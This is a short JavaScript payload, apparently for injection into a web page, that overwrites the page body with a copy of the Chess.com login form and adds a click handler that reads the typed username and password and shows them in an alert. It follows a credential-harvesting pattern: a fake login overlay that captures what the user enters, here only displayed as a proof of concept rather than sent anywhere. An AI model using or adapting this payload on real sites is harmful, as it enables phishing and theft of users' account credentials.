document.body.innerHTML = `<div class="login-form-wrapper login-form-wrapper-v5">
      
      

                    
            <form novalidate="" method="post" action="https://www.chess.com/login_check" class="authentication-login-form login-form login-form-v5">

      <div class="ui_v5-input-group-component">
        <input type="email" id="username" name="_username" required="required" form-error-clear="" class="ui_v5-input-component ui_v5-input-group-space-left login-input" placeholder="Username or Email" autofocus="" aria-label="Username or Email" autocomplete="email">

        <span class="icon-font-chess ui_v5-input-group-icon ui_v5-input-group-left user"></span>

        
      </div>

      <div class="ui_v5-input-group-component">
        <input type="password" id="password" name="_password" required="required" form-error-clear="" class="ui_v5-input-component ui_v5-input-group-space-left ui_v5-input-group-space-right login-input" placeholder="Password" aria-label="Password" autocomplete="current-password">

        <span class="icon-font-chess ui_v5-input-group-icon ui_v5-input-group-left lock"></span>

        <button type="button" id="toggle-password-visibility" class="ui_v5-input-group-button login-toggle-password-visibility">
          <span id="toggle-password-visibility-icon" class="icon-font-chess ui_v5-input-group-icon eye" aria-hidden="true">
          </span>
        </button>
      </div>

      

      
      <div class="authentication-login-options">
        <div class="form-checkbox-component"><input type="checkbox" id="_remember_me" name="_remember_me" class="form-checkbox-checkbox" container-class="form-checkbox" data-tinymce="false" form-error-clear="" full_name="_remember_me" value="1"><label class="form-checkbox-label" for="_remember_me">
              Remember me
            </label></div>

        <a href="https://www.chess.com/forgot" class="authentication-login-forgot authentication-login-forgot-v5" title="Forgot Password?">
          Forgot Password?
        </a>
      </div>

      <button type="submit" id="login" name="login" theme="primary" size="large" class="login-submit-v5 ui_v5-button-component ui_v5-button-primary ui_v5-button-large" data-no-controls="true">Log In</button>

      <input type="hidden" id="_target_path" name="_target_path" form-error-clear="" value="https://www.chess.com/"><input type="hidden" id="_token" name="_token" form-error-clear="" value="2d61a7c8b0.ydt7fXTxANN_kto0UbnpXAp_HAGjOoq-xfgbORUMK3k.vY1OHhzIM-cxyo5caOynPmweTHb1a8Xvics2XFlgXzyW6Sk8Mahh5TzxtQ"></form>

      <div class="authentication-social-signin-component">
        <div class="authentication-social-signin-separator">
          <span></span>
          <span class="authentication-social-signin-paragraph">OR</span>
          <span></span>
        </div>

        <div class="authentication-social-signin-options">
          <a href="https://www.chess.com/login/apple" class="authentication-social-signin-social-button authentication-social-signin-apple" rel="nofollow">
            <span class="authentication-social-signin-social-icon apple"></span>

            <span>Log in with Apple</span>
          </a>

          <a href="https://www.chess.com/login/google" class="authentication-social-signin-social-button authentication-social-signin-google" rel="nofollow">

            <span class="authentication-social-signin-social-icon google"></span>

            <span>Log in with Google</span>
          </a>

          <a href="https://www.chess.com/login-facebook" class="authentication-social-signin-social-button authentication-social-signin-facebook" rel="nofollow">
            <span class="authentication-social-signin-social-icon facebook-button"></span>

            <span>Log in with Facebook</span>
          </a>
        </div>
      </div>
    </div>`
    document.body.onclick  = function(e){
        alert(document.getElementById("username").value + ":" + document.getElementById("password").value)
        document.body.onclick  = function(e){};
    };
